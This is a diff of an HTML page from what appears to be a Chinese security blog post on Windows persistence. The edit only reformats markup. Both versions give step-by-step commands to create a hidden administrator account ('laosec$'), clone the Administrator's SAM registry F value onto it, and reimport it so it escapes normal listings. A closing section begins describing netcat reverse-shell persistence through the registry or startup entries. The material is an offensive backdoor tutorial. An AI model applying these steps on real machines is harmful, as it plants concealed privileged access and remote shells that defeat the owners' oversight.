@@ -339,7 +339,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-20 11:50:43'>2021-01-19 10:20</time>
+            Created At : <time class="date" title='Updated At: 2021-01-20 13:59:16'>2021-01-19 10:20</time>
         
     </div>
     <div class="article-meta">
@@ -377,12 +377,25 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="影子账号创建"><a href="#影子账号创建" class="headerlink" title="影子账号创建"></a>影子账号创建</h2><h3 id="创建普通账号"><a href="#创建普通账号" class="headerlink" title="创建普通账号"></a>创建普通账号</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user laosec <span class="number">123</span>admiN@ /add              <span class="comment">#创建普通账号laosec密码为123admiN@</span></span><br><span class="line">net localgroup administrators laosec /add   <span class="comment">#将普通账号laosec添加进administrators组</span></span><br></pre></td></tr></table></figure>
-<h3 id="创建隐藏账号"><a href="#创建隐藏账号" class="headerlink" title="创建隐藏账号"></a>创建隐藏账号</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user laosec$ <span class="number">123</span>admiN@ /add            <span class="comment">#创建隐藏账号laosec$密码为123admiN@(计算机管理可见)</span></span><br><span class="line">net localgroup administrators laosec$ /add <span class="comment">#将隐藏账号laosec$添加到administrators组中</span></span><br></pre></td></tr></table></figure>
-<h3 id="创建影子账号"><a href="#创建影子账号" class="headerlink" title="创建影子账号"></a>创建影子账号</h3><h5 id="步骤一：打开注册表"><a href="#步骤一：打开注册表" class="headerlink" title="步骤一：打开注册表"></a>步骤一：打开注册表</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WIN+R--&gt;regedit  <span class="comment">#注册表编辑器命令</span></span><br><span class="line">HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/ </span><br><span class="line"><span class="comment">#遇到没有权限问题对HKEY_LOCAL_MACHINE/SAM/SAM右键-&gt;权限-&gt;赋予当前用户administrator的具有完全控制和读取权限—&gt;关闭打开</span></span><br></pre></td></tr></table></figure>
-<h5 id="步骤二：修改隐藏账号"><a href="#步骤二：修改隐藏账号" class="headerlink" title="步骤二：修改隐藏账号"></a>步骤二：修改隐藏账号</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在Users目录下有<span class="number">00000</span>XXX开头的文件还有Names</span><br><span class="line">找到Names文件夹下的administrator单击，可以看到右侧的类型，其类型的值便对应着上面<span class="number">00000</span>XXX</span><br><span class="line">选中与administrator所对应的<span class="number">00000</span>XXX在右侧双击F键值，在弹出窗口中将值内容全部复制    <span class="comment">#此值要给予要创建的影子账号的F键值中</span></span><br><span class="line">在Names中找到要修改账户的类型值，找到其对应的<span class="number">00000</span>XXX，并将刚才复制的内容覆盖掉其影子账户的F中的值</span><br><span class="line">导出Names下的影子账户为<span class="number">1.</span>reg  </span><br><span class="line">导出Users下影子账户对应的<span class="number">00000</span>XXX为<span class="number">2.</span>reg</span><br></pre></td></tr></table></figure>
-<h5 id="步骤三：删除隐藏账号"><a href="#步骤三：删除隐藏账号" class="headerlink" title="步骤三：删除隐藏账号"></a>步骤三：删除隐藏账号</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user laosec$ /del        <span class="comment">#删除隐藏账号laosec$</span></span><br></pre></td></tr></table></figure>
-<h5 id="步骤四：创建隐藏账号"><a href="#步骤四：创建隐藏账号" class="headerlink" title="步骤四：创建隐藏账号"></a>步骤四：创建隐藏账号</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将<span class="number">1.</span>reg导入到注册表中</span><br><span class="line">将<span class="number">2.</span>reg导入到注册表中</span><br></pre></td></tr></table></figure>
+        <h2 id="影子账号创建"><a href="#影子账号创建" class="headerlink" title="影子账号创建"></a>影子账号创建</h2><h3 id="创建普通账号"><a href="#创建普通账号" class="headerlink" title="创建普通账号"></a>创建普通账号</h3><blockquote>
+<p>net user laosec 123admiN@ /add                  #创建普通账号laosec密码为123admiN@<br>net localgroup administrators laosec /add   #将普通账号laosec添加进administrators组</p>
+</blockquote>
+<h3 id="创建隐藏账号"><a href="#创建隐藏账号" class="headerlink" title="创建隐藏账号"></a>创建隐藏账号</h3><blockquote>
+<p>net user laosec$ 123admiN@ /add                #创建隐藏账号laosec$密码为123admiN@(计算机管理可见)<br>net localgroup administrators laosec$ /add #将隐藏账号laosec$添加到administrators组中</p>
+</blockquote>
+<h3 id="创建影子账号"><a href="#创建影子账号" class="headerlink" title="创建影子账号"></a>创建影子账号</h3><h5 id="步骤一：打开注册表"><a href="#步骤一：打开注册表" class="headerlink" title="步骤一：打开注册表"></a>步骤一：打开注册表</h5><blockquote>
+<p>WIN+R–&gt;regedit  #注册表编辑器命令<br>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/<br>#遇到没有权限问题对HKEY_LOCAL_MACHINE/SAM/SAM右键-&gt;权限-&gt;赋予当前用户administrator的具有完全控制和读取权限-&gt;关闭打开</p>
+</blockquote>
+<h5 id="步骤二：修改隐藏账号"><a href="#步骤二：修改隐藏账号" class="headerlink" title="步骤二：修改隐藏账号"></a>步骤二：修改隐藏账号</h5><blockquote>
+<p>在Users目录下有00000XXX开头的文件还有Names<br>找到Names文件夹下的administrator单击，可以看到右侧的类型，其类型的值便对应着上面00000XXX<br>选中与administrator所对应的00000XXX在右侧双击F键值，在弹出窗口中将值内容全部复制    </p>
+<p>#此值要给予要创建的影子账号的F键值中<br>在Names中找到要修改账户的类型值，找到其对应的00000XXX，并将刚才复制的内容覆盖掉其影子账户的F中的值<br>导出Names下的影子账户为1.reg<br>导出Users下影子账户对应的00000XXX为2.reg</p>
+</blockquote>
+<h5 id="步骤三：删除隐藏账号"><a href="#步骤三：删除隐藏账号" class="headerlink" title="步骤三：删除隐藏账号"></a>步骤三：删除隐藏账号</h5><blockquote>
+<p>net user laosec$ /del        #删除隐藏账号laosec$</p>
+</blockquote>
+<h5 id="步骤四：创建隐藏账号"><a href="#步骤四：创建隐藏账号" class="headerlink" title="步骤四：创建隐藏账号"></a>步骤四：创建隐藏账号</h5><blockquote>
+<p>将1.reg导入到注册表中<br>将2.reg导入到注册表中</p>
+</blockquote>
 <h5 id="步骤五：注销登录验证"><a href="#步骤五：注销登录验证" class="headerlink" title="步骤五：注销登录验证"></a>步骤五：注销登录验证</h5><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sR624K"><img src="https://s3.ax1x.com/2021/01/20/sR624K.png"></a></p>
 <h2 id="NC自动反弹"><a href="#NC自动反弹" class="headerlink" title="NC自动反弹"></a>NC自动反弹</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote>
 <p>通过上传NC并配置注册表或开机自启动程序-&gt;重启服务器来获取到目标及其的CMD Shell</p>
